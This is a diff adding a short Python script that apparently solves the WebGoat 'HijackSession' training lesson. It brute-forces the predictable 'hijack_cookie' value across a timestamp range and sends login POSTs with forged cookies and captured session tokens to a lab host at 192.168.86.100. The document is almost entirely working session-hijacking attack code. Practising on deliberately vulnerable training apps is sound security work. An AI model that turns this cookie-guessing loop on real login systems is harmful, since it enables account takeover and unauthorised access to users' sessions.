@@ -1,0 +1,41 @@
+import requests
+
+username = 'admin1'
+password = '123456'
+JSESSIONID = 'fsDPJaVX__qNr00UQGvuxWL5qJGtAViV5N7C_rko'
+
+hijack_cookie='5108379228911105606-1690350759858'
+hijack_cookie='5108379228911105608-1690350766357'
+
+url = 'http://192.168.86.100:8081/WebGoat/HijackSession/login'  # Replace with your target URL
+
+for i in range(1690350766357-1690350759858):
+    try_cookie = '5108379228911105607-'+str(i+1690350759858)
+
+
+    headers = {
+        'host': '192.168.86.100:8081',
+        'Connection': 'keep-alive',
+        'Content-Length': '58',
+        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+        'Accept': '*/*',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua-mobile': '?0',
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+        'sec-ch-ua-platform': '"macOS"',
+        'Origin': 'https://192.168.86.100:8081',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Dest': 'empty',
+        'Referer': 'https://192.168.86.100:8081/WebGoat/start.mvc',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Cookie': 'hijack_cookie='+try_cookie+'; JSESSIONID='+JSESSIONID+'; WEBWOLFSESSION=KiA_t-xC1DGJ8wUcg6kd2fFBuNszPeX_D67heewM',
+    }
+
+    data = {'username': 'your_username', 'password': 'your_password'}  # Replace with your login data
+
+    response = requests.post(url, headers=headers, data=data)
+
+    print(response.status_code)  # Print the status code of the response
+    print(response.text)  # Print the response content
